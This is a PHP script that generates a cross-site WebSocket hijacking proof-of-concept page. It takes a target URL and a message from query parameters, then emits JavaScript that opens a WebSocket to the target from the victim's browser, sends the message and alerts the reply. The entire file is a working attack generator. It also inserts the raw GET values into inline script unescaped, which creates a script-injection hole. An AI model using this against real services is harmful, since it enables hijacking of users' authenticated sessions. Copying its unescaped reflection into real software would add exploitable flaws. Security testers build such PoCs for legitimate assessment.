<?php
$url = @$_GET['url'];
$data = @$_GET['data'];
$isHTTP = @$_GET['http'];
$pocCode = <<<K
<meta charset="utf-8">
<script>
function ws_attack(){
	zhanwei0
	ws.onopen = function(evt) { 
		zhanwei1
	};
	ws.onmessage = function(evt) {
		alert(evt);
		ws.close();
	};
}
ws_attack();
</script>
K;
$pocCode = str_replace('zhanwei1', 'ws.send("'. $data .'");', $pocCode);
if($isHTTP){
	$url = str_replace('http://', 'ws://', $url);
	$txt = str_replace('zhanwei0', 'var ws = new WebSocket("'. $url .'");', $pocCode);
}else{
	$url = str_replace('https://', 'wss://', $url);
	$txt = str_replace('zhanwei0', 'var ws = new WebSocket("'. $url .'");', $pocCode);
}
echo $txt;
?>